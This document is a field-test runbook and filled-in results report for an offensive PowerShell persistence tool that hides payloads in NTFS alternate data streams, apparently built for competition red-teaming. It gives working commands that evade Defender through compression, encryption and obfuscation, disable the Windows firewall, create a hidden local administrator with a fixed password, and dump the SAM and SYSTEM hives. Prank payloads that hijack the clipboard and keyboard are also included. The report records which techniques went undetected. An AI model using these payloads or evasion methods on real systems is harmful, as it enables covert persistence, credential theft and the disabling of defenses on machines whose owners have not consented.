# ADS v2.4 Field Test Runbook

**Purpose:** High-signal validation of ADS across critical features and real payloads.
**Environment:** Kali (generation) → Windows VM (deployment + execution).
**Open questions this tests:** BUG-015 (DeflateStream evasion), BUG-011 (-Encrypt), BUG-018 (ZeroWidth graceful failure), overall pipeline health.

---

## Reporting guidance (read before testing)

After running all tests, paste back a filled-in report template (bottom of this file). **Do NOT paste:**
- Full OneLiner banner/header output — only errors
- Full PowerShell stack traces — only the `At line:X` and exception message lines
- Full deployment output — only `[+]`, `[-]`, `[!]` status lines and any red errors

**DO paste in full:**
- Output of the Defender event check command (short, critical signal)
- Output of the task list check command (short, critical signal)
- Canary check output

---

## STEP 0: Environment capture

### Kali — verify version
```bash
cd /path/to/Apparition-Delivery-System-WithClaude-Snapshot6
grep "Version:" src/ADS-OneLiner.ps1 | head -3
# Should include: Version: 2.4
```

### Windows — run once, paste full output in report
```powershell
@{
    OS      = (Get-CimInstance Win32_OperatingSystem).Caption
    Build   = (Get-CimInstance Win32_OperatingSystem).BuildNumber
    EngineV = (Get-MpComputerStatus).AMEngineVersion
    SigV    = (Get-MpComputerStatus).AntivirusSignatureVersion
    RTP     = (Get-MpComputerStatus).RealTimeProtectionEnabled
    PS      = $PSVersionTable.PSVersion.ToString()
} | Format-Table -AutoSize
```

---

## Framework Tests

### T1: BASELINE — No compression, no encryption
**Tests:** Core pipeline end-to-end. If this fails, nothing else will work.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t1-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate None \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t1-baseline.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t1-baseline.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t1-baseline.txt`, then:
```powershell
# Get task name from output, fire it manually
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem $env:TEMP | Where-Object Name -like "ads-t1-*" | Select-Object Name, LastWriteTime
```
**Pass:** Canary file found in `$env:TEMP`. Defender silent.

---

### T2: COMPRESSION — DeflateStream evasion (BUG-015 CRITICAL)
**Tests:** Core Session 6 work. Must pass before v2.4 merges to main.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t2-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate None \
    -UseCompression \$true \
    -OutputFile /tmp/ads-t2-compress.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t2-compress.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t2-compress.txt`. Watch Defender tray icon during paste. Then:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem $env:TEMP | Where-Object Name -like "ads-t2-*" | Select-Object Name, LastWriteTime
```
**Pass:** Defender CLEAN during paste AND during task execution. Canary found.
**If Defender fires:** Record exact detection name (from tray or Event 1116). Note whether it fired on paste or on task execution.

---

### T3: ENCRYPT — BUG-011 status check
**Tests:** Whether `-Encrypt` still triggers Defender Trojan detection.
**Note:** Queue ran an encrypted payload successfully last session — this confirms whether that was `-Encrypt` (AES) or compression-only.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t3-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Encrypt \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t3-encrypt.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t3-encrypt.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t3-encrypt.txt`. Observe Defender response. Then:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem $env:TEMP | Where-Object Name -like "ads-t3-*" | Select-Object Name, LastWriteTime
```
**Pass (BUG-011 RESOLVED):** Defender clean + canary found.
**Expected (BUG-011 unresolved):** Defender fires with Trojan detection on paste. Note exact detection name.

---

### T4: OBFUSCATION TIERS — Generation only
**Tests:** All 4 tiers generate without script errors. No Windows step needed.

**Kali:**
```bash
for tier in None Basic Advanced Paranoid; do
  pwsh -NoProfile -Command "
    ./src/ADS-OneLiner.ps1 \
      -Payload 'Write-Host ok' \
      -Persist task \
      -Trigger AtLogOn \
      -Obfuscate $tier \
      -UseCompression \$false \
      -OutputFile /tmp/ads-t4-$tier.txt
  " 2>&1 | grep -E "Error|Exception|FAIL|✓"
  echo "[$tier] EXIT=$? SIZE=$(wc -c < /tmp/ads-t4-$tier.txt 2>/dev/null || echo 0)b"
done
```
**Pass:** All 4 tiers EXIT=0, all files > 500 bytes.

---

### T5: ZEROWIDTH + REGISTRY — BUG-018 reproduction
**Tests:** Whether ZeroWidth stream names + registry persistence fails gracefully or silently.
**Note:** Queue observed silent failure during manual testing. This reproduces it.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t5-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist registry \
    -Obfuscate Advanced \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t5-zw-reg.txt
" 2>&1
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t5-zw-reg.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t5-zw-reg.txt`. Then:
```powershell
# Check registry Run key for new entries
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -EA 0 |
    Select-Object * -ExcludeProperty PS* | Format-List
```
**Pass (graceful):** Clear warning or error emitted — operator knows it failed.
**Bug confirmed:** Silent completion with no entry in registry and no warning.
**Report:** All output from Kali generation AND last 10 lines from Windows paste.

---

### T6: MULTI-INSTANCE — 3 tasks created
**Tests:** InstanceCount > 1 creates the correct number of tasks.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t6-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist task \
    -Trigger AtLogOn \
    -InstanceCount 3 \
    -Obfuscate Basic \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t6-multi.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t6-multi.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t6-multi.txt`. Then:
```powershell
$tasks = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" -and $_.TaskPath -notlike "\MicrosoftEdge*" }
$tasks | Select-Object TaskName, State | Format-Table
"Task count: $($tasks.Count)"
```
**Pass:** 3+ new tasks appear.

---

### T7: DEEP PLACEMENT — Denylist + fallback
**Tests:** BUG-016 fix — no locked file selection, ADS verified before success declared.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t7-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist task \
    -Trigger AtLogOn \
    -UseDeepPlacement \$true \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t7-deep.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t7-deep.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t7-deep.txt`. Report the `[+] ADS written to:` line from the output.
**Pass:** Deployment succeeds (prints ADS path, not an error). ADS path is NOT qmgr.db or a .edb file.

---

## Red Team TTP Tests

### T8: FIREWALL DISABLE — Recurring task
**TTP:** T1562.004 — Impair Defenses: Disable or Modify System Firewall

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'netsh advfirewall set allprofiles state off' \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate Basic \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t8-fw.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t8-fw.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire manually, then verify:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
netsh advfirewall show allprofiles state | Select-String "State"
```
**Pass:** All profiles show `State OFF`. Defender clean.
**Cleanup:** `netsh advfirewall set allprofiles state on`

---

### T9: HIDDEN ADMIN — Registry-concealed local account
**TTP:** T1136.001 — Create Account: Local Account + T1564.002 — Hidden Users

**Kali:**
```bash
cat > /tmp/payload-t9.ps1 << 'PSEOF'
$u='svc_upd'; $p='P@ssw0rd1!'
net user $u $p /add 2>$null
net localgroup administrators $u /add 2>$null
$k='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
if(!(Test-Path $k)){New-Item $k -Force|Out-Null}
Set-ItemProperty $k $u 0 -Type DWord -Force 2>$null
New-Item "$env:TEMP\ads-t9-ok.txt" -Force | Out-Null
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-t9.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate Basic \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t9-admin.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t9-admin.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire, then verify:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
net user svc_upd 2>$null; Get-ChildItem "$env:TEMP\ads-t9-ok.txt" -EA 0
```
**Pass:** `net user svc_upd` shows the account. Canary found. Account hidden from login screen.
**Cleanup:** `net user svc_upd /delete`

---

### T10: CREDENTIAL DUMP — SAM/SYSTEM registry hive export
**TTP:** T1003.002 — OS Credential Dumping: Security Account Manager
**Note:** Requires SYSTEM context. Task scheduler runs as SYSTEM by default.

**Kali:**
```bash
cat > /tmp/payload-t10.ps1 << 'PSEOF'
$t = "$env:TEMP"
reg save HKLM\SAM "$t\ads-sam.hiv" /y 2>$null
reg save HKLM\SYSTEM "$t\ads-sys.hiv" /y 2>$null
if(Test-Path "$t\ads-sam.hiv"){ New-Item "$t\ads-t10-ok.txt" -Force | Out-Null }
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-t10.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate Advanced \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t10-sam.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t10-sam.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire, then verify:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem "$env:TEMP\ads-sam.hiv","$env:TEMP\ads-t10-ok.txt" -EA 0 | Select-Object Name, Length
```
**Pass:** `ads-sam.hiv` exists with size > 0. Canary found.
**Cleanup:** `Remove-Item "$env:TEMP\ads-sam.hiv","$env:TEMP\ads-sys.hiv" -Force -EA 0`

---

### T11: COMPRESS + ENCRYPT + PARANOID OBFUSCATE — Full operational stack
**Tests:** All evasion layers active together. Real-world deployment posture.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t11-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Encrypt \
    -UseCompression \$true \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate Paranoid \
    -Randomize \$true \
    -OutputFile /tmp/ads-t11-full.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t11-full.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t11-full.txt`. Watch Defender carefully. Fire, then:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem $env:TEMP | Where-Object Name -like "ads-t11-*" | Select-Object Name, LastWriteTime
```
**Pass:** Defender clean at all stages. Canary found.
**Note:** If this fires Defender, note exactly which stage (paste, task registration, task execution).

---

## Meme Payload Tests

### M1: CLIPBOARD RICKROLL — MEME-006 (SYSTEM OK, time-limited)
**Tests:** SYSTEM-context clipboard access. Validates SYSTEM can reach user clipboard.

**Kali:**
```bash
cat > /tmp/payload-m1.ps1 << 'PSEOF'
$end = (Get-Date).AddMinutes(2)
while((Get-Date) -lt $end){
    Set-Clipboard "Never gonna give you up - Red Team <3 CCDC 2026"
    Start-Sleep -Seconds 15
}
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-m1.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-m1-clipboard.txt
" 2>&1 | grep -E "^\[|Error|Exception"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-m1-clipboard.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire task. Open Notepad and press Ctrl+V.
**Pass:** Clipboard contains rickroll text. **Fail note:** If clipboard is empty, SYSTEM cannot reach user clipboard on this session configuration — report which Windows build.

---

### M2: CAPS LOCK DISCO — MEME-005 (SYSTEM → keyboard test, time-limited)
**Tests:** Whether WScript.Shell SendKeys from SYSTEM reaches the active user session keyboard.

**Kali:**
```bash
cat > /tmp/payload-m2.ps1 << 'PSEOF'
$wsh = New-Object -ComObject WScript.Shell
$end = (Get-Date).AddSeconds(60)
while((Get-Date) -lt $end){
    $wsh.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 400
    $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 400
    $wsh.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 400
}
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-m2.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-m2-disco.txt
" 2>&1 | grep -E "^\[|Error|Exception"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-m2-disco.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire task. Watch keyboard indicator LEDs for 60 seconds.
**Pass:** LEDs blink in sequence. **Fail note:** If nothing happens, SendKeys from Session 0 cannot cross session boundary on this build — report which Windows build.

---

### M3: MATRIX RAIN — MEME-004 (Spawns console window)
**Tests:** Whether a SYSTEM task can spawn a visible console window on the user desktop.

**Kali:**
```bash
cat > /tmp/payload-m3.ps1 << 'PSEOF'
$script = @'
$host.UI.RawUI.BackgroundColor="Black"; $host.UI.RawUI.ForegroundColor="Green"; Clear-Host
$w=$host.UI.RawUI.WindowSize.Width; $drops=@{}
$chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()"
$end=[DateTime]::Now.AddMinutes(2)
while([DateTime]::Now -lt $end){
    $col=Get-Random -Maximum $w; $drops[$col]=0
    foreach($c in @($drops.Keys)){
        $y=$drops[$c]
        if($y -lt $host.UI.RawUI.WindowSize.Height){
            $host.UI.RawUI.CursorPosition=New-Object System.Management.Automation.Host.Coordinates($c,$y)
            Write-Host $chars[(Get-Random -Maximum $chars.Length)] -NoNewline -ForegroundColor Green
            $drops[$c]++
        } else { $drops.Remove($c) }
    }
    Start-Sleep -Milliseconds 50
}
'@
$f="$env:ProgramData\sysmon_diag.ps1"; $script | Out-File $f -Force
Start-Process powershell -ArgumentList "-NoProfile -File `"$f`"" -WindowStyle Normal
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-m3.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-m3-matrix.txt
" 2>&1 | grep -E "^\[|Error|Exception"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-m3-matrix.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire task manually. Check if green console window appears.
**Pass:** Matrix rain window appears on desktop. **Fail note:** Window may not cross from Session 0 to Session 1. If invisible, report the session configuration.
**Cleanup:** `Remove-Item "$env:ProgramData\sysmon_diag.ps1" -Force -EA 0`

---

### M4: NOTEPAD FLOOD — MEME-002 (AtLogOn — interactive session required)
**Tests:** Interactive-session payload delivery via AtLogOn trigger. 10 notepads cascade.

**Kali:**
```bash
cat > /tmp/payload-m4.ps1 << 'PSEOF'
$msg = "      _     `n     (o>    `n     //\    `n    V_/_    `n`nRed Team Was Here`nCCDC 2026"
1..10 | ForEach-Object {
    $f = "$env:TEMP\rt_$_.txt"; $msg | Out-File $f -Force
    Start-Process notepad $f; Start-Sleep -Milliseconds 200
}
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-m4.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-m4-notepads.txt
" 2>&1 | grep -E "^\[|Error|Exception"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-m4-notepads.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Log off and log back on (AtLogOn trigger — cannot fire manually from SYSTEM for interactive payloads).
**Pass:** 10 notepads cascade on login. **Note:** Reduced from 50 — scale up for real deployment.
**Cleanup:** Close notepads. `Remove-Item "$env:TEMP\rt_*.txt" -Force -EA 0`

---

## Post-Test State Checks (Windows)

Run these once after all tests. Paste full output in report.

```powershell
# 1. Defender detections from last 2 hours (THE most important signal)
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 50 -EA 0 |
    Where-Object { $_.Id -in @(1116,1117) -and $_.TimeCreated -gt (Get-Date).AddHours(-2) } |
    Select-Object TimeCreated, @{n='Detection';e={$_.Properties[0].Value}} |
    Format-Table -AutoSize
# Print "CLEAN" if no output

# 2. All non-Microsoft scheduled tasks created during testing
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" -and $_.TaskPath -notlike "\MicrosoftEdge*" } |
    Select-Object TaskName, TaskPath, State | Format-Table -AutoSize

# 3. Canary files in TEMP
Get-ChildItem $env:TEMP | Where-Object { $_.Name -like "ads-*" -or $_.Name -like "rt_*" } |
    Select-Object Name, LastWriteTime | Format-Table -AutoSize
```

---

## Cleanup (Windows)

```powershell
# 1. Remove all non-Microsoft tasks (review list from check #2 first!)
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" -and $_.TaskPath -notlike "\MicrosoftEdge*" } |
    ForEach-Object { Unregister-ScheduledTask $_.TaskName -Confirm:$false }

# 2. Remove HKCU Run entries added by tests
# (Review Get-ItemProperty HKCU:\...\Run output first, remove only test entries)

# 3. Remove temp and payload files
Remove-Item "$env:TEMP\ads-*" -Force -EA 0
Remove-Item "$env:TEMP\rt_*" -Force -EA 0
Remove-Item "$env:ProgramData\sysmon_diag.ps1" -Force -EA 0

# 4. Restore defenses disabled by T8/T11 (if they ran)
netsh advfirewall set allprofiles state on
Set-MpPreference -DisableRealtimeMonitoring $false

# 5. Remove test admin if T9 ran
net user svc_upd /delete 2>$null
```

---

## Report Template

Fill in and paste back. Use `OK`/`FAIL` and `CLEAN`/`FIRED:[name]`.

```
FIELD TEST RESULTS
Date: 19 FEB 2026
Results of Step 0:
Name    Value
----    -----
PS      5.1.26100.7462
Build   26200
RTP     True
EngineV 1.1.26010.1
SigV    1.445.152.0
OS      Microsoft Windows 11 Home

--- KALI GENERATION ---  format: EXIT=0/1  SIZE=Xb  ERR=[none or first error line]
T1  BASELINE:          EXIT= 0 SIZE= 22400b ERR= none
T2  COMPRESS:          EXIT=0 SIZE=17292b ERR= none
T3  ENCRYPT:           EXIT=0 SIZE=32865b ERR= Trojan detected by Defender
T4  OBFUSCATE TIERS:   None= OK Basic= OK Advanced= OK Paranoid= OK  (OK or FAIL)
T5  ZW+REGISTRY:       EXIT=0 SIZE=33797b ERR= At line:54 char:76… (full requested paste after page break)
T6  MULTI (x3):       EXIT=0 SIZE=23616b ERR= none
T7  DEEP:             EXIT=0 SIZE=26367b ERR= none
T8  FIREWALL:         EXIT=0 SIZE=21716b ERR= none. Windows Security alert that the firewall is off showed, but alternative payload would fix that.
T9  ADMIN:             EXIT=0 SIZE=23684b ERR= none (most excellent payload!)
T10 SAM DUMP:          EXIT=0 SIZE=27538b ERR= none
T11 FULL STACK:        EXIT=0 SIZE=23411b ERR= Exception calling "Invoke" with "0" argument(s): "Method invocation failed because [System.Char] does not contain a
method named 'ToCharArray'."
At line:1 char:4497
+ ... :UTF8.GetString($_ob.ToArray());[scriptblock]::Create($_txt).Invoke()
M1  CLIPBOARD:         EXIT=0 SIZE=26999b ERR= none (amazing!). The terminal isn’t hidden for it, but that can likely be fixed
M2  DISCO:             EXIT=0 SIZE=26669b ERR= none (the physical/cyber boundary could make this my favorite). The terminal isn’t hidden for it, but that can likely be fixed
M3  MATRIX:            EXIT=0 SIZE=28832b ERR= none
M4  NOTEPADS:          EXIT=0 SIZE=26772b ERR= none

--- WINDOWS DEPLOYMENT ---  format: DEPLOY=OK/FAIL  DEFENDER=CLEAN/FIRED:[name]  CANARY=FOUND/MISSING
T1  BASELINE:    DEPLOY= OK  DEFENDER= CLEAN  CANARY= FOUND
T2  COMPRESS:    DEPLOY= OK  DEFENDER= CLEAN  CANARY= FOUND         <- Most important result
T3  ENCRYPT:     DEPLOY= FAIL  DEFENDER= FIRED[Trojan]  CANARY=N/A due to defender         <- BUG-011 status
T5  ZW+REGISTRY: DEPLOY= FAIL  DEFENDER= N/A due to deploy error  REGISTRY_ENTRY= N/A  WARNED= N/A
T6  MULTI:       DEPLOY= OK DEFENDER= CLEAN TASK_COUNT= 3
T7  DEEP:        DEPLOY= OK  DEFENDER= CLEAN  ADS_PATH= C:\ProgramData\Microsoft\Windows\WER\Temp\aria-debug.log:FrnEbTKC
T8  FIREWALL:    DEPLOY= OK  DEFENDER= CLEAN (Windows Security alert that firewall is off appeared, but defender did not complain)  FW_DISABLED=YES
T9  ADMIN:       DEPLOY= OK  DEFENDER= CLEAN  USER_CREATED=YES
T10 SAM DUMP:    DEPLOY= OK  DEFENDER= CLEAN  SAM_HIV_SIZE= 45056
T11 FULL STACK:  DEPLOY= FAIL DEFENDER= N/A  CANARY= N/A 

--- MEME RESULTS ---
M1  CLIPBOARD:   DEPLOY= OK  DEFENDER= CLEAN EFFECT=rickroll appeared and kept coming back, awesome! The terminal wasn’t hidden, but likely can be fixed
M2  DISCO:       DEPLOY= OK DEFENDER= CLEAN EFFECT=LEDs blinked (my keyboard only has caps lock LED, but I love the physical cyber boundary interaction!). The terminal wasn’t hidden, but likely can be fixed
M3  MATRIX:      DEPLOY= OK DEFENDER= CLEAN EFFECT=window visible (very nostalgic, I love it)
M4  NOTEPADS:    DEPLOY= OK DEFENDER= CLEAN EFFECT= 10 notepads appeared (tabs are created not cascading windows). It did not happen after logging out and logging back in though.

--- DEFENDER EVENTS (paste full output of check #1, or write CLEAN) ---

PS C:\WINDOWS\system32> Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 50 -EA 0 |
>>     Where-Object { $_.Id -in @(1116,1117) -and $_.TimeCreated -gt (Get-Date).AddHours(-5) } |
>>     Select-Object TimeCreated, @{n='Detection';e={$_.Properties[0].Value}} |
>>     Format-Table -AutoSize

TimeCreated           Detection
-----------           ---------
2/19/2026 10:50:40 PM Microsoft Defender Antivirus
2/19/2026 10:50:21 PM Microsoft Defender Antivirus
2/19/2026 10:50:21 PM Microsoft Defender Antivirus

--- TASK LIST (paste full output of check #2) — (I did run some payloads multiple times)

PS C:\WINDOWS\system32> Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" -and $_.TaskPath -notlike "\MicrosoftEdge*" } |
>>     Select-Object TaskName, TaskPath, State | Format-Table -AutoSize

TaskName                                                                     TaskPath   State
--------                                                                     --------   -----
BackgroundIntelligentTransfer                                                \          Ready
CryptSvcBackup                                                               \          Ready
DiskCleanupTask                                                              \          Ready
LanguageComponentsInstaller                                                  \          Ready
MemoryDiagnosticScheduler                                                    \          Ready
MicrosoftEdgeUpdateTaskMachineCore{C900FF57-766A-4ED8-93B8-4EBA71C7900C}     \        Running
MicrosoftEdgeUpdateTaskMachineUA{E9E44CB9-94C4-41E4-85D4-30878A4F8816}       \          Ready
NetworkListServiceUpdate                                                     \          Ready
OneDrive Reporting Task-S-1-5-21-140453382-295067975-2065914850-1000         \          Ready
OneDrive Standalone Update Task-S-1-5-21-140453382-295067975-2065914850-1000 \          Ready
OneDrive Startup Task-S-1-5-21-140453382-295067975-2065914850-1000           \          Ready
SpeechModelDownload                                                          \          Ready
SystemOptimization                                                           \          Ready
TPMMaintenanceTask                                                           \          Ready
WinSAT_AWZGDQ                                                                \          Ready
WinSAT_JBUEKL                                                                \          Ready
WinSAT_WBSIFM                                                                \          Ready
WiredAutoConfig                                                              \          Ready

--- CANARY FILES in TEMP --- (I ran some commands multiple times)

Name                  LastWriteTime
----                  -------------
ads-sam.hiv           2/19/2026 11:49:00 PM
ads-sys.hiv           2/19/2026 11:49:00 PM
ads-t1-1334458920.txt 2/19/2026 10:35:58 PM
ads-t10-ok.txt        2/19/2026 11:49:00 PM
ads-t2-1683893645.txt 2/19/2026 10:48:36 PM
ads-t6-111548602.txt  2/19/2026 11:13:30 PM
ads-t6-165455222.txt  2/19/2026 11:13:30 PM
ads-t6-402057972.txt  2/19/2026 11:13:30 PM
ads-t7-1751422106.txt 2/19/2026 11:51:49 PM
ads-t7-474391705.txt  2/19/2026 11:52:14 PM
ads-t7-615374362.txt  2/19/2026 11:15:13 PM
ads-t9-ok.txt         2/19/2026 11:27:58 PM
rt_1.txt              2/20/2026 12:12:53 AM
rt_10.txt             2/20/2026 12:12:55 AM
rt_2.txt              2/20/2026 12:12:54 AM
rt_3.txt              2/20/2026 12:12:54 AM
rt_4.txt              2/20/2026 12:12:54 AM
rt_5.txt              2/20/2026 12:12:54 AM
rt_6.txt              2/20/2026 12:12:54 AM
rt_7.txt              2/20/2026 12:12:54 AM
rt_8.txt              2/20/2026 12:12:55 AM
rt_9.txt              2/20/2026 12:12:55 AM

--- ERRORS (paste any error lines not captured above, one per test ID) ---

Noted in other sections

--- NOTES (unusual behavior, unexpected results, observations) —

Noted in other sections
```

TEST 5 ERRORS:


ON WINDOWS:
… aQBnAGcAZQByAHMAPQBAACgAKQAKACQAXwB0AD0ATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFQAcgBpAGcAZwBlAHIAIAAtAEEAdABMAG8AZwBPAG4ACgAkAF8AdAAuAEQAZQBsAGEAeQA9ACcAUABUADEATQAnAAoAJABfAHQAcgBpAGcAZwBlAHIAcwArAD0AJABfAHQACgAkAF8AdAA9AE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBUAHIAaQBnAGcAZQByACAALQBBAHQAUwB0AGEAcgB0AHUAcAAKACQAXwB0AC4ARABlAGwAYQB5AD0AJwBQAFQAMQBNACcACgAkAF8AdAByAGkAZwBnAGUAcgBzACsAPQAkAF8AdAAKACQAXwB0AFAAPQBOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ATwBuAGMAZQAgAC0AQQB0ACAAKABHAGUAdAAtAEQAYQB0AGUAKQAuAEEAZABkAE0AaQBuAHUAdABlAHMAKAAxACkAIAAtAFIAZQBwAGUAdABpAHQAaQBvAG4ASQBuAHQAZQByAHYAYQBsACAAKABOAGUAdwAtAFQAaQBtAGUAUwBwAGEAbgAgAC0ATQBpAG4AdQB0AGUAcwAgADUAKQAgAC0AUgBlAHAAZQB0AGkAdABpAG8AbgBEAHUAcgBhAHQAaQBvAG4AIAAoAE4AZQB3AC0AVABpAG0AZQBTAHAAYQBuACAALQBEAGEAeQBzACAAOQA5ADkAOQApAAoAJABfAHQAUAAuAFIAYQBuAGQAbwBtAEQAZQBsAGEAeQA9ACcAUABUADEATQAnA